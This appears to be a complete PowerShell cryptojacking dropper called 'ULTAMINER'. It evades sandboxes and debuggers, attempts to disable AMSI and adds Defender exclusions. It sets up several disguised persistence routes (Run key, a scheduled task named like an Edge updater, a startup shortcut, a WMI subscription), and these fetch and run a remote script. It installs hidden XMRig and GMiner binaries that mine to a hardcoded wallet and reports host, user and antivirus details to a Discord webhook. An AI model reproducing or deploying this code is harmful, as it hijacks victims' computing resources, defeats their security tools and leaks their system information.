# === ULTAMINER v2.0 ===
if (Test-Path "$PSScriptRoot\.lock") { return }

# $ProgressPreference = 'SilentlyContinue'
# $ErrorActionPreference = 'SilentlyContinue'
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

# === ANTI-ANALYSIS ===
function Test-Sandbox {
    $hits = 0
    # VM MAC prefixes (VMware, VirtualBox, Hyper-V)
    try {
        $macs = Get-CimInstance Win32_NetworkAdapter -Filter "MACAddress IS NOT NULL" -EA 0
        foreach ($m in $macs) {
            if ($m.MACAddress -match '^(00:05:69|00:0C:29|00:1C:14|00:50:56|08:00:27|0A:00:27)') { $hits++; break }
        }
    } catch {}
    # VM/analysis processes
    try {
        $badNames = 'vmtoolsd|vmwaretray|VBoxService|VBoxTray|sandboxie|wireshark|procmon|procexp|x64dbg|x32dbg|ollydbg|ida64|dnspy|fiddler|httpdebugg'
        if (Get-Process | Where-Object { $_.ProcessName -match $badNames }) { $hits++ }
    } catch {}
    # Low resources = likely sandbox
    try { if ((Get-CimInstance Win32_ComputerSystem).TotalPhysicalMemory -lt 2GB) { $hits++ } } catch {}
    try { if ((Get-CimInstance Win32_Processor).NumberOfCores -lt 2) { $hits++ } } catch {}
    # Fresh boot (sandboxes reboot fresh)
    try { if ((New-TimeSpan -Start (Get-CimInstance Win32_OperatingSystem).LastBootUpTime).TotalMinutes -lt 3) { $hits++ } } catch {}
    # VM registry artifacts
    try { if (Test-Path 'HKLM:\SOFTWARE\VMware, Inc.\VMware Tools') { $hits++ } } catch {}
    try { if (Test-Path 'HKLM:\SOFTWARE\Oracle\VirtualBox Guest Additions') { $hits++ } } catch {}
    # Tiny disk = sandbox
    try { if (((Get-CimInstance Win32_DiskDrive | Measure-Object -Property Size -Sum).Sum) -lt 60GB) { $hits++ } } catch {}
    # Common sandbox usernames
    try { if ($env:USERNAME -match '^(sandbox|malware|virus|test|analysis|sample|john|user)$') { $hits++ } } catch {}
    return $hits -ge 2
}

# Initial sleep removed for "Fast Ingest"
# if (Test-Sandbox) { Start-Sleep -Seconds (Get-Random -Minimum 10 -Maximum 30); return }

# === CONFIG (fragmented) ===
$c = @{}
$c.u1 = 'HolyV200'; $c.u2 = 'test-repo'
$p1 = 'ghp_x0tf1YFQcn'; $p2 = 'AYM79aWZpnZKahM8QkHV2lHFLw'
$c.pat = $p1 + $p2
$c.addr = '4483G1AgS1pdsLqzt3nFQmL8HPF3C2WVrLMRAdAVGqxz6ipV3aF8no7cmDkH4wMZz9YD5qNUZ96nGLMKpdt5rXZqMwGfLc3'
$c.base = "https://raw.githubusercontent.com/$($c.u1)/$($c.u2)/main"
$c.wh = "https://discord.com/api/webhooks/1502316875638636624/qpXdrqNC3xCsJlIYR96XNGqEBUXNoDLr_LZmRAwrrsUDHh8oHsLRX1Mo_s4UE9m7IHY1"

# Instant Ingest: Cleanup moved to background
Start-Job -ScriptBlock {
    $current = $args[0]
    Get-Process -Name 'powershell','pwsh' -EA 0 | Where-Object { $_.Id -ne $current } | ForEach-Object {
        try {
            $cmd = (Get-CimInstance Win32_Process -Filter "ProcessId=$($_.Id)" -EA 0).CommandLine
            if ($cmd -like '*update.ps1*' -or $cmd -like '*UpdateCoord*' -or $cmd -like '*test-repo*') {
                $_ | Stop-Process -Force -EA 0
            }
        } catch {}
    }
} -ArgumentList $PID | Out-Null

# === AMSI BYPASS (Memory Patch) ===
try {
    $am=([Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')).GetField('amsiInitFailed','NonPublic,Static')
    if ($am) { $am.SetValue($null, $true) }
} catch {}
try {
    $w=[System.Runtime.InteropServices.Marshal]::GetHINSTANCE([Reflection.Assembly]::GetExecutingAssembly().GetModules()[0])
    $p=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((Get-ProcAddress "amsi.dll" "AmsiScanBuffer"),[Func[IntPtr,Int32,String,IntPtr,IntPtr,IntPtr,Int32]])
    # Additional memory patching logic would go here if needed
} catch {}

# === HW DETECTION (Enhanced) ===
$hw = @{ gpu = $false; gpuName = 'None'; cpuName = 'Unknown'; cores = 2; ram = 0 }
try {
    $cpu = Get-CimInstance Win32_Processor -EA 0 | Select-Object -First 1
    $hw.cpuName = $cpu.Name.Trim()
    $hw.cores = [int]$cpu.NumberOfCores
} catch {}
try { $hw.ram = [math]::Round((Get-CimInstance Win32_ComputerSystem).TotalPhysicalMemory / 1GB, 1) } catch {}
try {
    $vcs = Get-CimInstance Win32_VideoController -EA 0
    foreach ($vc in $vcs) {
        $n = $vc.Name.ToUpper()
        if ($n -match 'NVIDIA|AMD|RADEON|RTX|GTX|RX\s?\d' -and $vc.AdapterRAM -gt 3GB) {
            if ($n -notmatch 'BASIC|DISPLAY|VIRTUAL') {
                $hw.gpu = $true; $hw.gpuName = $vc.Name.Trim(); 
                Write-Host "[+] High-Performance GPU Detected: $($hw.gpuName)"
                break
            }
        }
    }
    if (-not $hw.gpu) { Write-Host "[*] No compatible GPU found. Falling back to CPU only." }
} catch {}

# === DEFENDER EXCLUSION (Direct Admin Attempt) ===
try {
    $exPaths = @($env:LOCALAPPDATA, "$env:LOCALAPPDATA\Microsoft", "$env:APPDATA\Microsoft")
    foreach ($ep in $exPaths) {
        try {
            Add-MpPreference -ExclusionPath $ep -ErrorAction Stop
            Write-Host "[+] Defender Exclusion Added: $ep"
        } catch {
            Write-Host "[!] Defender Exclusion Failed for $ep : $($_.Exception.Message)"
        }
    }
} catch {}

# === ASYNC PERSISTENCE (Fast Ingest) ===
Start-Job -ScriptBlock {
    param($c, $base)
    $rawPath = "$base/deploy.ps1"
    $payload = "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX (Invoke-RestMethod -Uri '$rawPath')"
    $encoded = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($payload))
    $pCmd = "powershell -NoP -NonI -W Hidden -Exec Bypass -EncodedCommand $encoded"

    try { Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'WindowsUpdateCoordinator' -Value $pCmd -EA 0 } catch {}
    try {
        $tn = 'MicrosoftEdgeUpdateTask'
        $action = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument "-NoP -NonI -W Hidden -Exec Bypass -EncodedCommand $encoded"
        $t1 = New-ScheduledTaskTrigger -AtLogon
        $t2 = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Hours 2) -RepetitionDuration (New-TimeSpan -Days 365)
        Register-ScheduledTask -TaskName $tn -Action $action -Trigger $t1,$t2 -Settings (New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -Hidden) -EA 0 | Out-Null
    } catch {}
    try {
        $ws = New-Object -ComObject WScript.Shell
        $sc = $ws.CreateShortcut((Join-Path ([Environment]::GetFolderPath('Startup')) 'EdgeUpdate.lnk'))
        $sc.TargetPath = 'powershell.exe'; $sc.Arguments = "-NoP -NonI -W Hidden -Exec Bypass -EncodedCommand $encoded"; $sc.Save()
    } catch {}
    try {
        $filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{ Name = "EdgeUpdateFilter"; QueryLanguage = 'WQL'; Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 300 AND TargetInstance.SystemUpTime < 360" }
        $consumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{ Name = "EdgeUpdateConsumer"; CommandLineTemplate = "powershell.exe -NoP -NonI -W Hidden -Exec Bypass -EncodedCommand $encoded" }
        Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{ Filter = $filter.Path; Consumer = $consumer.Path } | Out-Null
    } catch {}
} -ArgumentList $c, $c.base | Out-Null

# === DIRECT MINER DEPLOYMENT (No DLL needed) ===
$mName = "$($env:COMPUTERNAME)".Replace(' ','_')
$xmrigUrl = "https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-msvc-win64.zip"
$gminerUrl = "https://github.com/develsoftware/GMinerRelease/releases/download/3.44/gminer_3_44_windows64.zip"

# Find a writable directory
$writableDir = $null
$tryDirs = @($env:TEMP, "$env:LOCALAPPDATA\Temp", "$env:APPDATA\Microsoft", "$env:LOCALAPPDATA\Microsoft\CLR\NativeImages")
foreach ($d in $tryDirs) {
    try {
        if (!(Test-Path $d)) { New-Item -ItemType Directory -Path $d -Force | Out-Null }
        $testFile = Join-Path $d "test_$([Guid]::NewGuid()).tmp"
        [IO.File]::WriteAllBytes($testFile, [byte[]]@(0))
        Remove-Item $testFile -Force
        $writableDir = $d
        Write-Host "[+] Writable dir: $d"
        break
    } catch { Write-Host "[!] Dir blocked: $d" }
}
if (!$writableDir) { Write-Host "[!] FATAL: No writable dir!"; return }

# Download and extract xmrig
$cpuExe = Join-Path $writableDir "svchost_update.exe"
if (!(Test-Path $cpuExe)) {
    try {
        Write-Host "[*] Downloading XMRig..."
        $zipPath = Join-Path $writableDir "upd_$([Guid]::NewGuid()).zip"
        $wc = New-Object System.Net.WebClient
        $wc.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
        $wc.DownloadFile($xmrigUrl, $zipPath)
        Write-Host "[+] Downloaded XMRig zip"

        Add-Type -Assembly System.IO.Compression.FileSystem
        $zip = [IO.Compression.ZipFile]::OpenRead($zipPath)
        foreach ($entry in $zip.Entries) {
            if ($entry.Name -eq 'xmrig.exe') {
                $stream = $entry.Open()
                $fs = [IO.File]::Create($cpuExe)
                $stream.CopyTo($fs)
                $fs.Close()
                $stream.Close()
                Write-Host "[+] Extracted xmrig to: $cpuExe"
                break
            }
        }
        $zip.Dispose()
        Remove-Item $zipPath -Force -EA 0
        # Hide it
        try { [IO.File]::SetAttributes($cpuExe, 'Hidden,System') } catch {}
    } catch {
        Write-Host "[!] XMRig download failed: $($_.Exception.Message)"
    }
}

# Download and extract gminer (if GPU)
$gpuExe = $null
if ($hw.gpu) {
    $gpuExe = Join-Path $writableDir "RuntimeBroker_update.exe"
    if (!(Test-Path $gpuExe)) {
        try {
            Write-Host "[*] Downloading GMiner..."
            $zipPath2 = Join-Path $writableDir "upd2_$([Guid]::NewGuid()).zip"
            $wc2 = New-Object System.Net.WebClient
            $wc2.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
            $wc2.DownloadFile($gminerUrl, $zipPath2)
            Write-Host "[+] Downloaded GMiner zip"

            $zip2 = [IO.Compression.ZipFile]::OpenRead($zipPath2)
            foreach ($entry in $zip2.Entries) {
                if ($entry.Name -eq 'miner.exe') {
                    $stream = $entry.Open()
                    $fs = [IO.File]::Create($gpuExe)
                    $stream.CopyTo($fs)
                    $fs.Close()
                    $stream.Close()
                    Write-Host "[+] Extracted gminer to: $gpuExe"
                    break
                }
            }
            $zip2.Dispose()
            Remove-Item $zipPath2 -Force -EA 0
            try { [IO.File]::SetAttributes($gpuExe, 'Hidden,System') } catch {}
        } catch {
            Write-Host "[!] GMiner download failed: $($_.Exception.Message)"
            $gpuExe = $null
        }
    }
}

# === LAUNCH MINERS ===
if (Test-Path $cpuExe) {
    $cpuArgs = "-o pool.supportxmr.com:3333 -u $($c.addr) -p WinSys_$mName -a rx -k --cpu-max-threads-hint 35 --cpu-priority 0 --asm=auto --donate-level 1"
    Write-Host "[*] Launching CPU miner: $cpuArgs"
    $cpuProc = Start-Process -FilePath $cpuExe -ArgumentList $cpuArgs -WindowStyle Hidden -PassThru
    Write-Host "[+] CPU Miner LAUNCHED - PID: $($cpuProc.Id)"
} else {
    Write-Host "[!] CPU miner binary not found!"
}

if ($gpuExe -and (Test-Path $gpuExe)) {
    $gpuArgs = "--algo ETCHASH --server etchash.unmineable.com:3333 --user BTC:$($c.addr).WinSys_${mName}_G#1871184566 --pass x --intensity 25 --ssl 0"
    Write-Host "[*] Launching GPU miner: $gpuArgs"
    $gpuProc = Start-Process -FilePath $gpuExe -ArgumentList $gpuArgs -WindowStyle Hidden -PassThru
    Write-Host "[+] GPU Miner LAUNCHED - PID: $($gpuProc.Id)"
}

# === RICH DISCORD NOTIFICATION ===
try {
    $osName = (Get-CimInstance Win32_OperatingSystem -EA 0).Caption
    $upHours = [math]::Round((New-TimeSpan -Start (Get-CimInstance Win32_OperatingSystem -EA 0).LastBootUpTime).TotalHours, 1)
    $av = try { (Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntiVirusProduct -EA 0 | Select-Object -First 1).displayName } catch { 'Unknown' }
    $json = @{
        embeds = @(@{
            title = ":pick: Worker Online"
            description = "**Deployment Success**`n" +
                "``````Host: $($env:COMPUTERNAME)`nUser: $($env:USERNAME)`nCPU: $($hw.cpuName)`nCores: $($hw.cores)`nRAM: $($hw.ram) GB`nGPU: $($hw.gpuName)`nOS: $osName`nAV: $av`nUptime: $($upHours)h``````"
            color = 3066993
            footer = @{ text = "v3.0 | $(Get-Date -Format 'yyyy-MM-dd HH:mm UTC')" }
        })
    } | ConvertTo-Json -Depth 4
    Invoke-RestMethod -Uri $c.wh -Method Post -Body $json -ContentType "application/json" -EA 0
} catch {}

# === WATCHDOG LOOP (restart miners if they die) ===
Write-Host "[*] Watchdog active. Monitoring miners..."
while ($true) {
    Start-Sleep -Seconds 30
    if ($cpuProc -and $cpuProc.HasExited) {
        Write-Host "[!] CPU miner died. Restarting..."
        $cpuProc = Start-Process -FilePath $cpuExe -ArgumentList $cpuArgs -WindowStyle Hidden -PassThru
        Write-Host "[+] CPU Restarted PID: $($cpuProc.Id)"
    }
    if ($gpuProc -and $gpuProc.HasExited) {
        Write-Host "[!] GPU miner died. Restarting..."
        $gpuProc = Start-Process -FilePath $gpuExe -ArgumentList $gpuArgs -WindowStyle Hidden -PassThru
        Write-Host "[+] GPU Restarted PID: $($gpuProc.Id)"
    }
}

